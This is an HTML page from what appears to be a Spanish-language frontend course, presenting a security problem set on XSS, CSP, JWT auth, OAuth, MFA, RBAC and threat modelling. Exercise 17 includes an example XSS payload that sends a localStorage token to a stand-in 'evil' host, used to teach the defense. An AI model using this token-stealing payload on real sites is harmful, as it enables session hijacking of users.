<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>S4 · Ejercicios — CS-FE</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg: #0a0e1a; --surface: #1e293b; --surface-2: #283649; --code-bg: #0f172a;
      --border: #334155; --text: #e2e8f0; --muted: #94a3b8;
      --accent: #38bdf8; --accent-2: #a78bfa; --gold: #fbbf24; --green: #34d399; --pink: #f472b6;
    }
    body {
      font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
      background: var(--bg); color: var(--text);
      line-height: 1.7; min-height: 100vh;
      padding: 2rem 1.5rem;
    }
    .wrap { max-width: 920px; margin: 0 auto; }

    .topbar {
      display: flex; justify-content: space-between; align-items: center;
      margin-bottom: 1.5rem;
      padding-bottom: 1rem;
      border-bottom: 1px solid var(--border);
    }
    .topbar a {
      color: var(--muted); font-size: 0.9em;
      text-decoration: none;
      padding: 0.4rem 0.8rem;
      border-radius: 5px;
      background: var(--surface);
      border: 1px solid var(--border);
      transition: all 0.15s;
    }
    .topbar a:hover { color: var(--accent); border-color: var(--accent); }
    .topbar .right { display: flex; gap: 0.5rem; }

    .meta {
      display: flex; gap: 1rem; flex-wrap: wrap;
      font-size: 0.82em; color: var(--muted);
      margin-bottom: 1.5rem;
      padding: 0.5rem 0.8rem;
      background: var(--surface);
      border-radius: 6px;
      border: 1px solid var(--border);
    }

    a { color: var(--accent); text-decoration: none; }
    a:hover { text-decoration: underline; }

    .render h1 {
      font-size: 2.2rem; font-weight: 800;
      background: linear-gradient(135deg, var(--accent), var(--accent-2));
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      margin-bottom: 1rem; line-height: 1.2;
    }
    .render h2 {
      font-size: 1.6rem; color: var(--gold);
      margin: 2.5rem 0 1rem;
      padding-bottom: 0.3rem;
      border-bottom: 1px solid var(--border);
    }
    .render h3 { font-size: 1.25rem; color: var(--accent); margin: 1.7rem 0 0.7rem; }
    .render h4 { font-size: 1.05rem; color: var(--pink); margin: 1.2rem 0 0.5rem; }
    .render p { margin-bottom: 1rem; }
    .render ul, .render ol { margin: 0.6rem 0 1.2rem 1.6rem; }
    .render li { margin-bottom: 0.35rem; }
    .render hr { border: 0; border-top: 1px solid var(--border); margin: 2.5rem 0; }
    .render strong { color: var(--text); font-weight: 700; }
    .render em { color: var(--gold); font-style: italic; }
    .render blockquote {
      border-left: 3px solid var(--accent);
      padding: 0.5rem 1rem; margin: 1rem 0;
      color: var(--muted); font-style: italic;
      background: rgba(56, 189, 248, 0.04);
    }
    .render code {
      background: var(--surface-2); color: var(--gold);
      padding: 1px 6px; border-radius: 3px;
      font-size: 0.9em;
      font-family: 'JetBrains Mono', Consolas, monospace;
    }
    .render pre {
      background: var(--code-bg); border: 1px solid var(--border);
      border-radius: 8px; padding: 1rem;
      overflow-x: auto; margin: 1rem 0; position: relative;
    }
    .render pre code {
      background: none; color: var(--text); padding: 0;
      font-size: 0.85em; line-height: 1.65;
    }
    .render table {
      width: 100%; border-collapse: collapse;
      margin: 1rem 0; font-size: 0.92em;
    }
    .render th, .render td {
      padding: 0.55rem 0.85rem;
      border: 1px solid var(--border); text-align: left;
    }
    .render th {
      background: var(--surface-2); color: var(--accent);
      font-weight: 600;
    }
    .render tr:nth-child(even) td { background: rgba(255,255,255,0.02); }

    .render details {
      background: var(--surface);
      border-left: 3px solid var(--gold);
      padding: 0.8rem 1rem;
      margin: 0.8rem 0;
      border-radius: 5px;
    }
    .render details[open] { padding-bottom: 1rem; }
    .render details summary {
      cursor: pointer; color: var(--gold); font-weight: 600;
    }
    .render details summary:hover { color: var(--text); }

    .render iframe {
      max-width: 100%; border-radius: 10px;
      border: 1px solid var(--border); margin: 1rem 0;
    }

    .copy-btn {
      position: absolute;
      top: 6px; right: 6px;
      background: var(--surface-2); color: var(--text);
      border: 1px solid var(--border);
      padding: 3px 9px; border-radius: 4px;
      font-size: 0.75em; cursor: pointer;
      opacity: 0; transition: all 0.15s;
      font-family: inherit;
    }
    .render pre:hover .copy-btn { opacity: 1; }
    .copy-btn:hover { background: var(--accent); color: var(--bg); }
    .copy-btn.copied { background: var(--green); color: var(--bg); }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="topbar">
      <a href="../../index.html">← Portal</a>
      <div class="right">
        <a href="../../lectures.html#s4">📚 Ver en viewer integrado</a>
      </div>
    </div>

    <div class="meta" id="meta"></div>

    <article class="render" id="content"></article>
  </div>

  <script id="md-content" type="application/json">"# Problem Set S-04 — Seguridad & Auth\n\n## Sección A — Audit\n\n1. Tomá un sitio que uses regularmente. Audit con [securityheaders.com](https://securityheaders.com) y [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com). Reportá:\n   - Grade actual\n   - Headers faltantes\n   - Top 3 mejoras recomendadas\n\n2. Auditá tu propia app deployada (la del capstone). Mismo análisis.\n\n3. Encontrá un anti-patrón en código real (open source o tuyo): JWT en localStorage, validación solo en cliente, etc. Documentalo y proponé fix.\n\n## Sección B — XSS\n\n4. Construí una app simple \"Comments\" donde:\n   - Usuarios pueden postear comentarios (text + opcional HTML).\n   - Versión 1: vulnerable (innerHTML directo).\n   - Versión 2: segura con DOMPurify para HTML, textContent para texto plano.\n   - Demostrá el ataque en la versión 1 y la defensa en la 2.\n\n5. Implementá un **CSP estricto** para una app React + Vite:\n   - Sin `'unsafe-inline'`.\n   - Con nonces para los scripts inline necesarios.\n   - Reportar violaciones a `/csp-report`.\n   - Que pase `csp-evaluator` sin warnings.\n\n## Sección C — Auth\n\n6. Implementá auth completa con email/password:\n   - Backend: Express o Hono con JWT + refresh tokens (rotation).\n   - Frontend: React con interceptor de fetch que refresca automático.\n   - Access token en memoria (Zustand), refresh en cookie httpOnly.\n   - Protected routes con `<ProtectedRoute />`.\n   - Tests: login válido, login inválido, expiración, refresh.\n\n7. Agregá **OAuth con Google** usando PKCE (sin librería de auth-as-a-service):\n   - Documentá los 6 pasos del flow.\n   - Manejá errores: user canceló, code inválido, network down.\n   - Mergeá la cuenta OAuth con la cuenta email/password si ya existe.\n\n8. Implementá **MFA con TOTP** (Time-Based One-Time Password):\n   - Usuario habilita MFA → mostrar QR para Google Authenticator.\n   - En login: pedir código de 6 dígitos.\n   - Usar librería: `otpauth` o similar.\n\n## Sección D — RBAC / ABAC\n\n9. Implementá RBAC para una app de blog:\n   - Roles: `admin`, `editor`, `author`, `reader`.\n   - Permisos: `articles:read|write|delete`, `users:manage`, `settings:edit`.\n   - Componente `<Can permission=\"articles:write\">` que oculta children si no tiene permiso.\n   - Hook `usePermission(perm)` que retorna boolean.\n\n10. Migrá a ABAC para soportar:\n    - Authors solo pueden editar SUS propios artículos.\n    - Editors solo en sus categorías asignadas.\n    - Multi-tenant: usuarios solo ven datos de su org.\n\n11. Usá [CASL](https://casl.js.org/) para implementar el mismo modelo. Compará con tu implementación manual.\n\n## Sección E — Headers de seguridad\n\n12. Configurá los siguientes headers en una app deployada (Vercel, Netlify, o servidor propio):\n    - `Strict-Transport-Security` (HSTS)\n    - `Content-Security-Policy` estricto con nonces\n    - `X-Content-Type-Options: nosniff`\n    - `Referrer-Policy: strict-origin-when-cross-origin`\n    - `Permissions-Policy` minimal\n    - Verificá con securityheaders.com → Grade A o A+.\n\n13. Configurá **Subresource Integrity (SRI)** para todos los scripts y estilos externos. Generá los hashes SHA-384.\n\n## Sección F — Threats específicos\n\n14. Implementá protección contra **open redirect**:\n    - Al loguearse: `?redirect=` query param.\n    - Validar que sea ruta relativa O dominio de allowlist.\n    - Test: intentar redirect a `https://evil.com` → debe ir a `/` por default.\n\n15. **Clickjacking defense**:\n    - Setear `frame-ancestors 'none'` en CSP.\n    - Implementá un test de Playwright que verifique que tu app NO se puede embeber en iframe externo.\n\n16. **Rate limiting** en login:\n    - Backend: max 5 intentos por IP / 15 min.\n    - Frontend: feedback claro cuando rate limit hit.\n    - Implementación opcional con Redis o en memoria.\n\n## Sección G — Token theft scenario\n\n17. Simulá un escenario de **token theft via XSS**:\n    - Versión vulnerable: token en localStorage.\n    - Atacante inyecta `<script>fetch('https://evil/steal?t='+localStorage.getItem('token'))<\/script>` (ej. via comentario sin sanitizar).\n    - Demostrar el robo.\n\n18. Versión defendida:\n    - Token en cookie httpOnly.\n    - CSP estricto.\n    - Comentarios sanitizados con DOMPurify.\n    - Demostrar que el ataque ya no funciona.\n\n## Desafío\n\n19. **App SaaS multi-tenant completa**:\n    - Auth: email/password + OAuth Google + MFA opcional.\n    - Multi-tenancy: cada user pertenece a una org, datos aislados.\n    - RBAC con 4 roles + permisos granulares.\n    - Audit log: quién hizo qué cuándo.\n    - Headers de seguridad grade A+.\n    - CSP estricto sin `'unsafe-inline'`.\n    - Tests de seguridad con Playwright (XSS, CSRF, IDOR).\n\n20. **Threat model document**:\n    - Diagrama de la app con boundaries.\n    - Lista de assets a proteger (datos, tokens, etc.).\n    - Lista de threats por capa (frontend, API, DB, infra).\n    - Mitigaciones aplicadas para cada uno.\n    - Risks aceptados con justificación.\n\n    Esto es lo que un security engineer escribe. Como senior, deberías saber producirlo.\n\n## Entregable\n\nRepo `cs-fe-senior-s04-security` con:\n- App SaaS completa (ej. 19).\n- Threat model document (ej. 20).\n- Audit reports (ej. 1-2) en formato Markdown.\n- Demo del XSS attack + defense (ej. 17-18).\n\nEsto es portfolio que un equipo serio mira con respeto.\n"</script>
  <script src="../../assets/vendor/marked.min.js"></script>
  <script>
    const md = JSON.parse(document.getElementById('md-content').textContent);
    const html = marked.parse(md);
    document.getElementById('content').innerHTML = html;

    // Reading time + word count
    const words = md.trim().split(/\s+/).length;
    const minutes = Math.max(1, Math.round(words / 200));
    document.getElementById('meta').innerHTML =
      `<span>⏱ ${minutes} min de lectura</span><span>📝 ${words.toLocaleString('es')} palabras</span>`;

    // Copy buttons en pre
    document.querySelectorAll('.render pre').forEach(pre => {
      const btn = document.createElement('button');
      btn.className = 'copy-btn';
      btn.textContent = 'copiar';
      btn.onclick = async (e) => {
        e.stopPropagation();
        const code = pre.querySelector('code')?.textContent ?? pre.textContent;
        try {
          await navigator.clipboard.writeText(code);
          btn.textContent = '✓ copiado';
          btn.classList.add('copied');
          setTimeout(() => { btn.textContent = 'copiar'; btn.classList.remove('copied'); }, 1500);
        } catch { btn.textContent = '✗ error'; }
      };
      pre.appendChild(btn);
    });

    // IDs en headings para anchor links
    document.querySelectorAll('.render h2, .render h3, .render h4').forEach(h => {
      const id = h.textContent.toLowerCase()
        .replace(/[^\w\sáéíóúñü-]/g, '')
        .replace(/\s+/g, '-').slice(0, 60);
      h.id = id;
    });
  </script>
</body>
</html>
